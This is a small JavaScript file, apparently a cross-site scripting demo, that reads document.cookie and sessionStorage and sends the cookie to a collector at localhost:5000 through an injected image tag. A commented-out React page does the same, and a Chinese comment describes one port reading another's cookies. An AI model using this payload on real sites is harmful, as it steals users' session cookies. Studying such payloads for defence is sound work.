// <!DOCTYPE html>
// <html lang="en">

// <head>
//   <meta charset="UTF-8">
//   <meta http-equiv="X-UA-Compatible" content="IE=edge">
//   <meta name="viewport" content="width=device-width, initial-scale=1.0">
//   <script src="https://cdn.bootcdn.net/ajax/libs/react/16.13.1/umd/react.production.min.js"></script>
//   <script src="https://cdn.bootcdn.net/ajax/libs/react-dom/16.13.1/umd/react-dom.production.min.js"></script>
//   <script src="https://cdn.bootcdn.net/ajax/libs/babel-standalone/7.0.0-beta.3/babel.min.js"></script>
//   <title>Document</title>
// </head>

// <body>
//   <div id="xss"></div>
// </body>
// <script type="text/babel">
//   console.log(document.cookie, 'document.cookie')
//   const compsButton = React.createElement(() => {
//     return <img src={'http://localhost:5000/img?c=' + document.cookie} />
//   })
//   ReactDOM.render(compsButton, document.getElementById("xss"));
// </script>

// </html>
console.log(document.cookie,window.sessionStorage, '我是5000端口访问4000端口的document.cookie')
const dom = document.createElement('img');
dom.src = 'http://localhost:5000/img?c=' + document.cookie;
document.body.appendChild(dom);